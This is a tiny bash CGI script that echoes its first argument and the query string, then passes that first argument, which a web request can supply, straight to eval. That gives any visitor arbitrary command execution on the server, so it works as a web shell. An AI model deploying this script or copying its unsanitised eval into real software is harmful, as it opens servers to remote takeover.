#!/bin/bash
echo "Content-type: text/plain"
echo ""
set -exv
echo "1: ${1}"
echo "QUERY_STRING: $QUERY_STRING"
echo ""
# Comment
eval "${1}" 2>&1
